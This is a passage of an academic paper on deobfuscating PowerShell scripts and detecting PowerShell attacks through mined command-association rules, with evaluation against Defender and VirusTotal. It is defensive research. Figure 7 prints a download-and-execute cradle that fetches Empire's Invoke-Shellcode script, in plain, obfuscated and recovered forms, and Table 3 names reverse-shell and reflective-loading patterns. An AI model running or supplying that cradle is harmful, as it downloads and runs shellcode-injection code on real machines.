+ Figure 6: Pass recovered script pieces indirectly (cropped)                                               very well, there can still be some hints left. Existing obfuscation
+                                                                                                           detection works for JavaScript [35] and PowerShell [17] have very
+which we call recovered pieces. The recovered pieces are parsed                                            high accuracy. Thus, we are motivated to employ a classifier to
+into recovered ASTs and replace the obfuscated subtrees. Such                                              detect whether a subtree is obfuscated.
+process iterates until there are no obfuscated subtrees left, thus can                                        Feature selection. We refer to existing obfuscation detection
+handle multi-layer obfuscation in a sequential or parallel fashion.                                        work [17, 35] and propose the following four types of features.
+Ultimately, we use a post-processing module to remove redundant                                             • Entropy of script pieces. The entropy represents the statis-
+structures added during the obfuscation process. In the following                                              tical characteristics of character frequencies. There are two
+                                      &("{0}{1}" -f'ie','x') (.("{2}{0}{1}" -f'c','t','new-oBje') ("{1}{0}
+      iex (New-Object                 {2}" -f'eb','neT.w','Client')).("{2}{1}{3}{0}"-f
+                                                                                                                & ("iex") (.("new-oBject")          iex (new-oBject
+      Net.WebClient).DownloadStri     'g','tri','doWnloAD','n').Invoke(("{6}{2}{26}{14}{8}{4}{11}{9}{13}{3}
+                                                                                                                ("neT.webClient")).                 "neT.webClient").doWnloADStrin
+      ng("hxxps://raw.githubuserc     {30}{0}{24}{1}{25}{7}{33}{16}{5}{15}{29}{19}{20}{10}{35}{32}{28}{27}
+                                                                                                                ("doWnloADString").Invoke(("https   g("https://raw.githubuserconte
+      ontent.com/PowerShellEmpire     {21}{23}{12}{22}{31}{18}{34}{17}"-
+                                                                                                                ://raw.githubusercontent.com/Powe   nt.com/PowerShellEmpire/Empire
+      /Empire/master/data/module_     f'hellE','/Em','tps','m','th','e','ht','ire/','/raw.gi','busercontent
+                                                                                                                rShellEmpire/Empire/master/data/m   /master/data/module_source/cod
+      source/code_execution/Invok     .','u','u','/','co','/','r/d','ast','s1','l','ul','e_so','io','Invoke
+                                                                                                                odule_source/code_execution/Invok   e_execution/Invoke-
+      e-Shellcode.ps1")               -
+                                                                                                                e-Shellcode.ps1"))                  Shellcode.ps1")
+                                      Sh','n','mpire','p',':','cut','e','ata/mod','/PowerS','el','e_ex','m'
+                                      ,'code.p','rce/cod'))
+
+
+
+
+                                                                                                     ...
+
+
+      (a) Original script                             (b) Obfuscated with Scheme 1                               (c) After deobfuscation            (d) After post-processing
+            and AST                                          Similarity = 0                                           Similarity = 0                      Similarity = 1
+
+                      Figure 7: Effects of obfuscation and deobfuscation on the scripts and AST of an malware sample
+
+   kinds of popular obfuscation techniques that may influence                                     or the current script piece is not a recoverable piece. For both cases,
+   the entropy substantially in most cases: randomization of all                                  we mark the subtree as a non-obfuscated subtree and move on to
+   variable and function names, and encoding. The entropy can                                     the next obfuscated subtree. Since we perform the deobfuscation
+   be calculated as follows:                                                                      in a bottom-up order, we can always find a recoverable script piece
+                                           Õ                                                      that is at a higher level and contains this subtree later.
+                                    H =−       Pi loд2Pi
+   where Pi represents the frequency of the i t h character.                                      4.5         AST Update
+ • Lengths of tokens. Almost all types of obfuscation techniques                                  After we obtain the recovered script pieces from the last step, we
+   change the length of tokens. These techniques include but                                      need to parse it to a new AST (recovered subtree) and update the
+   not limited to, encoding, string splitting, and string reorder-                                AST. This process has two main steps. First, we need to replace the
+   ing. Among all values related to token lengths, we pick the                                    recoverable subtree with the recovered subtree. Correspondingly,
+   mean and the maximum lengths of tokens as features.                                            the features of all its ancestors should be updated and all suspi-
+ • Distribution of AST types. The AST parser provided by Mi-                                      cious subtrees in recovered subtree should be pushed into the stack.
+   crosoft can provide all the 71 types of nodes such as PipelineAst,                             Second, the change of script pieces should be updated. Specifically,
+   ParenExpressionAst, CommandExpression-                                                         we store the recoverable pieces and recovered pieces in roots of
+   Ast, etc. During the obfuscation process, the numbers of nodes                                 obfuscated subtrees. Then we pass the changes from the bottom to
+   for certain node types are typically changed. For example, string                              top. Finally, when there are no obfuscated subtrees left, we can get
+   reordering will add several ParenExpressionAst nodes and                                       the deobfuscated script at the root.
+   StringConstantExpressAst nodes to AST. Thus, we count
+   the numbers of nodes for each node type and construct a 71-                                    4.6         Post processing
+   dimensional vector as a feature.
+                                                                                                  As shown in Figure 7, after reconstruction, we get a script that has
+ • Depth of AST. Almost all obfuscation techniques have a sig-
+                                                                                                  the same semantics as that for the original one. However, in terms of
+   nificant impact on the depth of the AST and the total nodes
+                                                                                                  syntax, there are still differences between these two scripts. These
+   count. For example, for encoding-based obfuscation, no matter
+                                                                                                  differences are mainly introduced by the obfuscation process. As
+   how many nodes the original script have, only about 10 nodes
+                                                                                                  mentioned above, the script pieces obtained by the deobfuscation
+   with a depth less than 6 left after encoding. Thus, we also use
+                                                                                                  process are all strings. Thus, to help interpreter understand the role
+   AST depth and total node count as features.
+                                                                                                  of each string, the process of obfuscation introduces extra tokens.
+   In total, we picked 76 features from three levels, namely, charac-                             For example, in script piece "("DownloadFile").Invoke($url)"
+ter level, token level and AST level. Note that traversing the AST                                the function Invoke tells interpreter that "DownloadFile" should
+once is enough to calculate features for all subtrees. In our imple-                              be treated as a member function and $url is the parameter for
+mentation, we use logistic regression with gradient descent [70] to                               the function. Also, obfuscation will add extra parentheses. In this
+perform the classification.                                                                       post-processing step, these syntax-level changes introduced by the
+                                                                                                  obfuscation process are located with regular expressions and fixed
+4.4      Emulation-based Recovery                                                                 accordingly.
+In this step, we set up a PowerShell execution session and execute                                   The overall effect of our deobfuscation approach on an example
+the obfuscated pieces detected in the last step. If the script piece                              script and its AST is shown in Figure 7. As shown, the final deob-
+is a recoverable script piece, the return value of this process is the                            fuscated script is almost the same as the original script. In §6, we
+recovered script piece. If the return value is not a string, it means                             use a similarity metric to quantifiably evaluate the effectiveness of
+that either the obfuscation detection result at the last step is wrong,                           our deobfuscation approach.
+                            - z, r                         -             Table 3: Representative examples and descriptions of newly-
+                            - z, x, y, s, t                              identified OOA rules for PowerShell attacks.
+        Deobfuscated Parser - x, s, r               Z:5         x:1
+           Scripts          - z, x, y, s, t
+                            - z, x, y, r, t   r:1    x:3        s:1            OOA rules                               Description
+                              Command query                                    NewTask, RegisterTaskDefinition, ...    Scheduled task COM
+            Parser
+                                 database            y:3        r:1
+                                                                               FromImage, CopyFromScreen, ...          Get-TimedScreenshot
+                             - z, r                  s:2       r:1             VirtuAlloc, Memset, CreateThread, ...   Reflective Loading
+                             - z, x, y, t
+         Matching            - x, s                  t:2       t:1             DownloadString, Invoke-Expression       IEX Downloaded String
+                             - x, r
+                             - ...
+                                                                               DownloadFile, Start-Process             Download & Execution
+                                                    FP-tree
+                                Frequent                                       UseshellExecute, TcpClient,
+                                itemsets
+        Detection                                                              RedirectStandardOutput, GetStream,      Reserve shell
+          Report                Calculate                                      GetString, Invoke-Expression, ...
+                                confidence
+                               and Support
+
+      Detection phase                           Training phase              As shown in Figure 8, the letters refer to commands or functions,
+                              - z, r                                     and the sets marked red indicate that the itemsets are extracted
+                                OOA rules                                from malicious scripts. Two steps are required to get an OOA rule.
+                                 database
+                                                                         First, we use the FP-growth algorithm [18] to generate frequent
+         Figure 8: Semantic-aware detection workflow                     patterns, such as {z, r} and {z, x, y, t} and so on. Then we select the
+                                                                         patterns that satisfy the rules that have the support and confidence
+                                                                         scores greater than the user-specified minimums. Specifically, sup-
+5     SEMANTIC-AWARE POWERSHELL                                          port represents the possibility of maliciousness, and confidence
+      ATTACK DETECTION                                                   represents generality. The support and confidence scores of rules
+Semantic-aware detection has many advantages over signature-             are defined as follows:
+based detection. Among all, the most significant one is that semantic-                                      count(I ∪ {Obj}, DB)
+aware detection is hard to be evaded by polymorphic variants. Be-                      support(I, Obj) =
+                                                                                                                      |DB|
+sides more robust attack detection, it also allows explanations and
+classifications of the malicious behaviors, which is highly desired                                               count(I ∪ {Obj}, DB)
+                                                                                      con f idence(I, Obj) =
+in malware analysis and forensics [29].                                                                               count(I , DB)
+   For binary program analysis, researchers usually use several          where I = {I 1 , ..., Im } is the set of commands. The function count(I ∪
+kinds of graphs, e.g., control-flow graphs [22] and dependency           {Obj}, DB) returns the number of records in DB where I ∪ {Obj}
+graphs [28], instead of API sets to represent semantics. This is         holds.
+because APIs used in the binary program only contain low-level              If our target is to detect maliciousness, the support and confi-
+semantics and thus can be ambiguous. In contrast, as shown in            dence of {z, r} are 0.4 and 1, respectively. The support and confidence
+Table 3, APIs in the PowerShell language contain a higher level of       of {z, x, y, t} are 0.6 and 0.33, respectively. Thus, {z, r} is picked as
+semantics, and thus semantics of PowerShell scripts can already be       OOA rules.
+understood easily by commands and functions sets. Considering               The samples’ behaviors are distributed unevenly in the dataset,
+that API sets can be processed much more efficiently compared to         mainly due to the PowerShell logging method. After initialization,
+graphs, in our system design we adopt API sets instead of graphs         the scripts for later stages are downloaded from the Internet at
+for PowerShell semantics detection.                                      runtime, which will be missed by traditional PowerShell logging
+   As shown in Figure 8, our detection system can be divided into        methods. Thus it is recommended to utilize script block logging
+two phases: training and detection, which are detailed below.            [31] to enhance the logging. In practice, we choose a support score
+                                                                         of 0.1 and a confidence score of 0.95. However, for some classes
+5.1     Training Phase                                                   of malicious scripts, we still do not have enough samples to train
+First, using the parser described in §4.2, we can get a set of AST       OOA rules. For these classes, we use hand-picked signatures as
+nodes corresponding to each deobfuscated script. As discussed in         an alternative. In total, we are able to extract 31 OOA rules newly
+§4.2, only several kinds of nodes, such as InvokeMemberExpression-       identified for PowerShell attacks, with some representative ones
+Ast, CommandAst, etc, need to be considered. Then we extract their       shown in Table 3.
+values and normalize them. Our normalization includes: (1) con-
+verting to lowercase, (2) deleting irrelevant characters, (3) check-     5.2     Detection Phase
+ing alias. For example, for a script that downloads a program and        In this phase, we parse the deobfuscated scripts into itemsets and
+launches it, the following set can be extracted: {’new-object’,          try to match the pre-trained OOA rules. The results cannot only
+’downloadfile’, ’start-process’}.                                        show the malicious scores but also the semantics of the scripts.
+   Objective-oriented Association Mining We employ an clas-
+sic classification based on OOA mining [68] on itemsets of com-          6 EVALUATION
+mands for detection. The OOA mines association frequency pat-
+terns that are specifically related to a pre-defined objective. Those    6.1 Evaluation Methodology
+frequent patterns are called OOA rules and carry the underlying          In this paper, we first evaluate the performance of our subtree-based
+semantics of the data.                                                   deobfuscation, which is divided into three parts. First, we evaluate
+whether we can find the minimum subtrees involved in obfusca-             intermediate source representations. Match detection algorithms
+tion, which can directly determine the quality of the deobfuscation.      are a critical issue in the clone detection process. After a source
+This is dependent on the classifier and thus we cross-validate the        code representation is decided, a carefully selected match detec-
+classifier with manually-labelled ground truth. Second, we verify         tion algorithm is applied to the units of source code representa-
+the quality of the entire obfuscation by comparing the similar-           tion. We employ suffix tree matching based on ASTs [40]. Both
+ity between the deobfuscated scripts and the original scripts. In         the suffix tree and AST are widely used in similarity calculation.
+this evaluation, we modify the AST-based similarity calculation           Moreover, such combination can be used to distinguish three types
+algorithm provided by [39]. Third, we evaluate the efficiency of de-      of clones, namely, Type 1(Exact Clones), Type 2(Renamed Clones),
+obfuscation by calculating the average time required to deobfuscate       Type 3(Near Miss Clones), which fits well for our situation.
+scripts obfuscated by different obfuscation methods.                         To this end, we parse each PowerShell script into an AST. Most
+   Next, we evaluate the benefit of our deobfuscation method on           of the code clone detection algorithm is line-based. However, lines
+PowerShell attack detection. In §2, we find that obfuscation can          wrapping is not reliable after obfuscation. We utilize subtrees in-
+evade most of the existing anti-virus engine. In this section, we         stead of lines. We serialize the subtree by pre-order traversal and
+compare the detection results for the same PowerShell scripts before      apply suffix tree works on sequences. Therefore, each subtree in one
+and after applying our deobfuscation method. In addition, we also         script is compared to each subtree in the other script. The similarity
+evaluate the effectiveness of the semantic-based detection algorithm      between the two subtrees is computed by the following formula:
+in Section 5.
+                                                                                               n = 2 × s/(2 × s + l + r ).
+6.1.1 PowerShell Sample Collection. To evaluate our system, we
+                                                                          where s represents the number of shared nodes, l stands for the
+create a collection of malicious and benign, obfuscated and non-
+                                                                          number of different nodes in subtree 1, and r represents the number
+obfuscated PowerShell samples. We attempt to cover all possible
+                                                                          of different nodes in subtree 2.
+download sources that can have PowerShell scripts, e.g., GitHub,
+                                                                             We only take subtree pairs with similarity greater than 0.7. To
+security blogs, open-source PowerShell attack repositories, etc.,
+                                                                          avoid repeatedly counting, once one subtree is picked, its ancestor
+instead of intentionally making selections among them.
+                                                                          nodes are ignored. Besides, to avoid coincidence, subtrees with
+Benign Samples: To collect benign PowerShell Scripts, we down-
+                                                                          fewer than 7 nodes will not be considered. Finally, the similarity
+load the top 500 repositories on GitHub under PowerShell language
+                                                                          scores between two scripts are calculated by the following formula:
+type using Chrome add-on Web Scraper [12]. We then find out the
+ones with PowerShell extension ’.ps1’ and manually check them                                 N = 2 × S/(2 × S + L + R).
+one by one to remove attacking modules. After this process, 2342
+                                                                          where S is the summary of s, L represents the number of different
+benign samples are collected in total.
+                                                                          nodes in tree 1, R stands for the number of different nodes in tree 2.
+Malicious Samples: The malicious scripts we use to evaluate de-
+                                                                          Detailed pseudo code for calculating similarity can be found in §A.
+tection are based on recovered scripts which consist of two parts.
+1) 4098 unique real-world attack samples collected from security
+blogs and attack analysis white papers [55]. Limited by the method        6.2    Evaluation Results
+of data collection, the semantics of the samples are relatively simple.   In this section, we evaluate the effectiveness and efficiency of our
+Most of the samples belong to the initialization or execution phase.      approach using the collected PowerShell samples described earlier
+2) To enrich the collection of malicious scripts, we pick other 43        (§6.1.1). The experiment results are obtained using a PC with In-
+samples from 3 famous open source attack repositories, namely,            tel Core i5-7400 Processor 3.5 GHz, 4 Cores, and 16 Gigabytes of
+PowerSploit [9], PowerShell Empire [1] and PowerShell-RAT [43].           memory, running Windows 10 64-bit Professional.
+Obfuscated Samples: In addition to the collected real-world ma-
+                                                                          6.2.1 Obfuscation Detection Accuracy. Accurate localization of ob-
+licious samples, which are already obfuscated, we also construct
+                                                                          fuscated script pieces is a prerequisite for our deobfuscation. For
+obfuscated samples through the combination of obfuscation meth-
+                                                                          obfuscation detection, we apply a logistic regression with gradient
+ods and non-obfuscated scripts. More specifically, we deploy four
+                                                                          descent binary classifier based on three levels of features mentioned
+kinds of obfuscation methods in Invoke-Obfuscation, mentioned in
+                                                                          in §4.3. To train the classifier, we manually select 1250 subtrees
+§2.3, namely, token-based, string-based, hex-encoding and security
+                                                                          as obfuscated samples (500 from token-based obfuscated samples,
+string-encoding on 2342 benign samples and 75 malicious. After
+                                                                          250 from each of the other three obfuscated samples). As for the
+this step, a total of 9968 obfuscated samples are generated.
+                                                                          unobfuscated samples, we randomly pick the same number of sub-
+6.1.2 Script Similarity Comparison. Deobfuscation can be regarded         trees whose root are PipelineAst from unobfuscated scripts. All
+as the reverse process of obfuscation. In the ideal case, deobfuscated    subtrees mentioned above are selected from 250 original scripts
+scripts should be exactly the same as the original ones. However, in      and corresponding 1000 obfuscated samples. The remaining 2167
+practice, it is difficult to achieve such perfect recovery for various    original scripts and corresponding 8668 obfuscated samples are
+reasons. However, the similarity between the recovered script and         selected as the testing set.
+the original script is still a good indicator to evaluate the overall        As a comparison, PSDEM [41] uses a series of regular expressions
+recovery effect.                                                          combined with some syntactic information to locate obfuscated
+   To measure the similarity of scripts, we adopt the methods of          script pieces. For example, to identify the $StrOrder in Figure 1,
+code clone detection. This problem is widely studied in the past          PSDEM will extract the following regex: "-f operator" in Figure
+decades [50]. Different clone granularity levels apply to different       1, which is a common string operation widely used for obfuscation.
+Among the four obfuscation schemes targeted in our approach, PS-
+DEM can cover S1 and S2 using "-f operator" and "replace()",
+but cannot cover S3 and S4.
+       Table 4: The accuracy of obfuscation detection
+           Obfuscation detection approachs       TPR      FPR
+                    Our approach                100%     1.8%
+                     PSDEM [41]                 49.9%    22.2%
+
+   Results. We apply both our subtree classifier and PSDEM’s regex        Figure 9: Average deobfuscation time for obfuscated scripts.
+on the testing set. As long as there is one match for one script, we
+regard it as a obfuscated case. To improve our obfuscation detection
+performance, we also employ emulation result to check the detec-          method to determine the correct order in which the deobfuscation
+tion result as mentioned in §4. The results are shown in table 4. As      logic should be applied.
+shown, our approach can achieve 100% true-positive rate(TPR) with            Thus, for multi-level obfuscated samples, manual analysis is
+false-positive rate as low as 1.8% on the testing set. In comparison,     necessary to decide the correct order of deobfuscation logic first,
+PSDEM only has 49.9% true-positive rate(FPR) since it fails on all        while our approach can automatically handle.
+the samples obfuscated with S3 and S4. At the same time, it has a
+22.2% false positive rate, which is much higher than our approach.        6.2.3 Deobfuscation Efficiency. Figure 9 shows the average time
+Based on the results, we find that this is mainly due to that the         required to deobfuscate one obfuscated script. The size of the origi-
+regexes can only be used to locate functions commonly used in             nal scripts used as samples ranges from 400 Byte to 400 KB, with
+obfuscation but not to determine whether the functions are used           an average of 5.4 KB. On average, it takes less than half a second to
+for obfuscation or a regular scenario, which indicates the inherent       do the deobfuscation, while the emulator takes about two-thirds
+limitation of regex based obfuscation detection.                          of the time, and the other takes up the rest of the time. The other
+6.2.2 Recovery Quality. Next, we evaluate the overall recovery            parts are mainly the reconstruction of AST and the recovery of
+quality by comparing the similarity between obfuscated sample             scripts. Emulator’s job is to undo the obfuscation. For encoding-
+scripts and original ones before and after deobfuscation using the        based obfuscation, the emulator needs to do the decoding, which
+methodology described in §6.1.2. In this experiment, we use all           is slower than string stitching for string-based obfuscation. The
+obfuscated samples in the training set mentioned above. The results       emulator takes much more time for token-based obfuscated scripts
+are shown in Table 5.                                                     because they contain more subtrees involved in obfuscation. A
+                                                                          typical script token-based obfuscated can contain more than 50
+Table 5: The average similarities of deobfuscated and origi-              obfuscated subtrees and require more calculations. The time spend
+nal ASTs                                                                  on the emulator can barely be reduced.
+                                         Deobfuscated    Deobfuscated
+     Obfuscation schemes   Obfuscated                                     6.2.4 Attack Detection based on Deobfuscated Scripts. Table 6 dis-
+                                        (our approach)   (PSDEM[41])
+             S1               1.8%           71.5%           70.6%        plays the impact of deobfuscation on detection. Here we use the
+             S2               0.1%           79.0%           79.5%
+             S3              0.01%           82.9%           0.01%
+                                                                          same sample as in Section 2.3. The rest of the unobfuscated samples
+             S4              0.004%          85.2%          0.004%        are used as training set for our detection system. We submit the
+           Overall            0.5%           79.7%           37.5%        samples separately to Microsoft online defender [10] and VirusTotal
+                                                                          [11]. For VirusTotal, as long as one of the AV engines detected it,
+   Results. As shown, after deobfuscation using our approach,             we consider it is detected. We also excluded three engine, namely,
+the average similarity increases significantly from 0.5% to 79.8%,        Kaspersky, ZoneAlarm and Sophos AV, which detect obfuscation
+which is about 160 times higher. Among all, the similarities for          instead of detecting maliciousness. These engines’ false positives
+scripts recovered from S2, S3 and S4 are higher that those for S1.        are too high so that their results have no reference value.
+This is because these three schemes are script block-based, which            As shown in Table 6, obfuscation can bypass detection effectively.
+can completely preserve the structure inside the script block after       For Windows Defender, detection rate reduces about 68 times at
+deobfuscation and thus achieve higher similarity scores. Note that,       least, from 89% to 1.3%. VirusTotal performs slightly better but still
+as indicated by the similarity scores, the deobfuscated scripts are not   fails in most case. Its detection rate reduces by 12.5% at least. Our
+exactly the same as the original ones. This is mainly because syntax-     approach, on the other hand, is almost unaffected by obfuscation.
+level changes in the obfuscation processes, e.g., using variables to      Detection rate reduces up to 8 percent. Moreover, our deobfuscation
+save intermediate values, thus does not affect the semantics-aware        module along can provide a lot help for existing detection systems.
+attack detection and understanding of functionality as shown later        For all obfuscation schemes, deobfuscation can improve the detec-
+in §6.2.4. A real-world sample is analyzed in appendix §B.                tion rate of Defender and VirusTotal significantly. The detection
+   In comparison, for S1 and S2, which PSDEM can cover, PSDEM             rate increase by at least 48% and 82.6% for Defender and VirusTotal,
+has a similar recovery quality with our approach. However, for ob-        respectively.
+fuscation techniques that PSDEM cannot support, there is nothing             Furthermore, among the four obfuscation schemes, scheme 2
+PSDEM can do. Moreover, PSDEM does not provide an automatic               fails most because it is based on string split. If scripts are not split
+                          Table 6: The effect of deobfuscation on detection and semantic-aware detection results
+                                                                                      Deobfuscation +                Deobfuscation +    Deobfuscation +
+                                      Samples                              Defender                     VirusTotal
+                                                                                         Defender                      VirusTotal         Our model
+                                          Original Scripts                  89.3%         89.3%           100%            100%              98.7%
+                                                  S1                         0.0%         48.0%           0.0%           76.0%              90.7%
+              Malicious                           S2                         1.3%         78.6%           8.0%           90.6%              93.3%
+                                                  S3                         0.0%         84.0%           2.6%           96.0%              92.0%
+                                                  S4                         0.0%         89.3%           0.0%           97.3%              93.3%
+               Benign       Original scripts, all 4 obfuscation schemes      0.0%          0.0%           0.0%            0.0%               0.0%
+
+
+fine-grain enough, they can still match signatures. And the de-                          that the testing sets for the first three columns and last columns are
+obfuscation effect on scheme 1 is the worst. That is because the                         different and corresponding to the testing sets in §6.2.1 and §6.2.4
+other three schemes are script block-based, the obfuscation does                         respectively. The result is shown in Table 8.
+not change the structure in the script block, and the structure re-
+mains intact after the deobfuscation. Besides, no detection approach
+have false positive, since that the PowerShell scripts’ structure is                     Table 8: Break-down analysis of individual major tech-
+relatively simple and have no ambiguity.                                                 niques used in deobfuscation
+   All in all, deobfuscation can significantly improve the detection                                                             Recovery                 Detection
+                                                                                                    Deobfuscation phases                       Time
+effect. Our semantic-based detection also has good results, which                                                                similarity               accuracy
+                                                                                                        w/ all 5 phases             80.4%      0.46s        92.3%
+means semantic analysis on deobfuscated scripts is feasible.
+                                                                                                   w/o (1) Extract subtrees        -14.7%     +404.3%      -12.4%
+                                                                                                w/o (2) Obfuscation detection      -43.7%     +108.7%      -54.7%
+Table 7: Comparison with state-of-the-art detection ap-                                       w/o (3) Emulation-based Recovery     -43.4%     +83.7%       -53.6%
+proaches in TPR.                                                                                      w/o (4) AST update            -0.6%      -6.5%        -0.1%
+                                                                                                   w/o (5) Post processing          -7.0%      -2.1%         0.0%
+                                Obfuscated      Deobfuscated     Mixed
+        Detection approaches
+                                  scripts          scripts       scripts
+           Our approach              -              92.3%         92.3%
+          AST-based [53]           0.0%             90.7%          9.6%                     The analysis results are shown in Table 8. Next, we describe
+        Character-based [32]       12.1%            95.7%         34.7%
+                                                                                         how we remove or replace each phase and discuss the results. “(1)
+                                                                                         Extract Subtrees” (§4.2) mainly focus on extracting suspicious sub-
+6.2.5 Comparison with State-of-the-Art PowerShell Detection Ap-
+                                                                                         trees. As shown, removing it means that there are more subtrees
+proaches. Rusak et al. [53] and Hendler et al. [32] present the latest
+                                                                                         we need to analyze, and incurs 4 times more analysis time. Mean-
+detection approaches for PowerShell, which apply AST-based and
+                                                                                         while, it leads to deterioration of deobfuscation and subsequent
+character-based features for detection respectively. Thus, we re-
+                                                                                         detection results. This is because without this pre-selection, we
+produce these two approaches to compare with our approach. For
+                                                                                         may choose the wrong recoverable subtree and fail to recover the
+the approach proposed by Hendler et al. [32], the original design
+                                                                                         original script pieces. The output of “(2) Obfuscation Detection”
+can support several different classifiers, and we only choose the
+                                                                                         (§4.3) determines the subsequent operations, so we cannot simply
+one with the best results on their paper (i.e., combination of a 3-
+                                                                                         remove this phase. Instead, we experiment with replacing it with
+CNN and traditional 3-gram [32]) to reproduce. In the training of
+                                                                                         the regex-based obfuscation detector introduced by PSDEM [41].
+these two previous approaches, we use the same training set and
+                                                                                         As shown, the accuracy of such regex-based obfuscation detector
+testing set mentioned above. The results are shown in Table 7. Re-
+                                                                                         is only half of ours, which results in a 43.7% decrease of similarity
+sults. As shown, both the AST-based and character-based detection
+                                                                                         and a 54.7% decrease of detection accuracy.
+approaches will be bypassed by obfuscation. And our deobfusca-
+                                                                                            After we get the recoverable pieces, the next deobfuscation phase
+tion system can increase their detection TPR by 87.2%. Once these
+                                                                                         in our design is “(3) Emulation-based Recovery” (§4.4). The latest
+scripts are deobfuscated, our results show that these two previ-
+                                                                                         automatic method for this task is PSDEM’s string manipulation
+ous approaches can achieve similar, or even higher true-positive
+                                                                                         based approaches, which entirely relies on regex-based obfuscation
+rates than our approach. However, we would like to note that since
+                                                                                         detector to accurately identify the obfuscation techniques. There-
+the features used by these two approaches are at the syntax level,
+                                                                                         fore, although the approach has good recovery quality for known
+they can be more easily evaded compared to our semantic-aware
+                                                                                         obfuscation techniques as discussed in §6.2.1, our results show that
+approach. To show this, we simply mix benign pieces into mali-
+                                                                                         this causes the similarity and detection accuracy to drop by nearly
+cious samples at the granularity of script lines, which changes AST
+                                                                                         half. “(4) AST Update” (§4.5) is mainly designed for the completion
+structure and character distributions without affecting the script
+                                                                                         of the deobfuscation process, i.e., putting the deobfuscated script
+behavior. In Table 7, we call them “Mixed scripts”. An example is
+                                                                                         pieces together to the whole recovered script. In terms of the benefit
+given in §C. As shown, these mixed scripts can greatly decrease
+                                                                                         on performance, this phase can help handle multi-layer obfuscation.
+the true-positive rates of AST-based and character-based detection
+                                                                                         In our results, since most of our samples only involve one layer of
+approaches, but cannot affect that of our approach.
+                                                                                         obfuscation, such benefit is not prominent across the entire dataset.
+6.2.6 Break-down analysis of techniques used in our deobfuscation.                       For the last phase, “(5) Post Processing” (§4.6), it is designed for
+To demonstrate the benefits of individual major techniques used in                       handling corner-case inconsistencies in the syntax recovery, and
+our deobfuscation, we remove or replace one major technique at a                         our results show that removing it decreases the recovery similarity
+time and then evaluate the impact to performance. It is noteworthy                       by 7%.
+7 DISCUSSION                                                             Table 9: Comparison of script-based malware detection
+                                                                         methods
+7.1 Generality of Our Approach
+                                                                                             Light-    True       True       Semantic      Anti-
+Although our subtree-based deobfuscation approach in this paper                              weight   Positive   Negative   Awareness   obfuscation
+is developed for PowerShell, its design does not require specific
+                                                                           Dynamic det.       no       high       high         yes         yes
+features of PowerShell. As long as the obfuscation is to cover the          Static det.       yes      low        high         no          no
+semantics by hiding the script pieces as strings, our approach can        Obfuscation det.    yes      low        low          no          yes
+                                                                           Our approach       yes      high       high         yes         yes
+be applied to achieve effective deobfuscation. As far as we know,
+JavaScript utilize similar obfuscation techniques [66].
+   Moreover, our method requires only a parser and an unmodified         to collect runtime characteristics. Rieck et al. [51] describe Cujo,
+interpreter for the target language, both of which typically have        which combines static and dynamic features in a classifier based on
+official tools available. Meanwhile, the strategy for updating the       support vector machines and extract Q-gram of tokens as signatures.
+tree and finally constructing the deobfuscated script is reusable.       The common disadvantages of dynamic methods are that they bring
+Therefore, the only extra work required to construct a deobfuscation     extra runtime overhead and thus are inefficient.
+system for a new language is to collect the samples of the obfuscated       Static detection. Canali et al. [20] present Prophiler, which em-
+subtree and train the obfuscated detector. The deobfuscated script       ploys multi-layer features to quickly filter non-malicious web pages.
+can be used with existing static detection systems, such as [26], for    Curtsinger et al. propose ZOZZLE [26], a mostly static approach,
+better detection results.                                                leverage AST for fast signature matching. Similar approaches are
+                                                                         also employed in PowerShell detection. [32] leverage deep learn-
+7.2    Possible Evasion Attacks                                          ing at characters level for malicious classification. Similarly, [53]
+Anti-debugging. Anti-debugging is a common approach for mal-             uses features extracted from AST. These studies are not resistant
+ware to evade detection [23, 57, 69]. The primary methods include        to obfuscation and thus are not accurate enough . Our automatic
+“logic bombs”, “time bombs”, etc., which means that the obfuscated       deobfuscation approach can potentially increase the accuracy of
+scripts will only be recovered at specific branches. More advanced       such techniques by exposing the actual logic of the code.
+methods may involve a machine-specific value, or an online value            Obfuscation detection. To overcome the effect of obfuscation,
+can only be acquired at a specific time as the decryption key, which     researchers propose to use detection obfuscation instead of detect-
+means that the scripts can only be recovered on the particular ma-       ing malicious scripts. [14, 35, 38] extract features from different
+chine or at a specific moment. These methods work for all offline        level for obfuscation detection in JavaScript. The closest work is
+analysis approaches, no matter they are dynamic or static. For the       proposed by Bohannon [17], which extracted 4098 features for Pow-
+primary methods, static approaches, including our approach, can          erShell obfuscation detection. However, such approaches assume
+achieve better results than dynamic ones by traversing all branches.     that all obfuscated scripts are also malicious. This assumption is
+For the more advanced methods, the only chance is to capture script      too strong and will bring a lot of false positives. Besides, these
+behaviours during the attack time, and thus our approach cannot          approaches focus only on the obfuscation detection of entire scripts
+work. However, advanced anti-debugging methods significantly in-         which may be bypassed by partial obfuscation.
+crease the cost of the attack. Therefore, we believe that such attacks
+are only likely to occur in attacks on high-value targets. For these     8.2    Deobfuscation Approaches
+high-value targets, it is necessary to apply more strict execution       Deobfuscation for binary. Obfuscation techniques, especially
+strategies and early review of scripts.                                  run-time packers, have been widely used by malware authors for
+   Logical obfuscation. In this paper, we mainly focus on string-        a long time as a means of evading static detection. The security
+based obfuscation (listed in §2), which regards the scripts or script    community proposed many different solutions to detect and clas-
+pieces as strings and obfuscate them. Logical obfuscation is another     sify packing techniques. Accurate identification of packing is the
+type of obfuscation targeted at disrupting the control flow and          first step towards solving the packing problem. Signature-based
+the data flow. Recovery of such obfuscation is orthogonal to that        approaches [46, 58] searching for unique patterns of known packers
+of string-based obfuscations [61] and thus is not covered in this        in executable files. However, such methods fail to detect new pack-
+paper. Actually, it is difficult to recover control flow and data flow   ers. To deal with unknown packers, researchers [34, 47, 49, 62, 63]
+only through static analysis [25, 67]. However, since PowerShell’s       employ multiple features for obfuscation detection. We employ a
+functions and commands themselves contain enough semantic for            similar method to locate obfuscation at AST subtrees level, which
+detection or analysis, it is highly difficult for logical obfuscation    is fine-grained and makes our system more flexible.
+alone to evade our detection.                                                Automatic unpacking relies on the observation that hidden code
+                                                                         is naturally revealed and then executed for the majority of packed
+8 RELATED WORK                                                           malware. Thus, different approaches are proposed to determine
+                                                                         the right moment to dump the hidden code [61]. These approaches
+8.1 Script-based Malware Detection                                       [27, 37, 44, 52] focus on different techniques for monitoring the
+As shown in Table 9, the malware detection methods for scripting         execution of binary. These dynamic approaches suffer from high
+languages can be divided into three categories.                          overhead and low program coverage. Nevertheless, a few static
+   Dynamic detection. Cova et al. present a system JSAND [25],           and hybrid approaches are proposed. Coogan et al. [23] propose to
+where suspicious scripts are further analyzed with the emulator          locate the transition point with control flow and alias analysis and
+extract unpacking logic with backward slicing. Caballero et al. [19]                         4b4b8b13c264c8f7d7034060e0e4818a573bebc576a94d7b13b4c1741591687f?
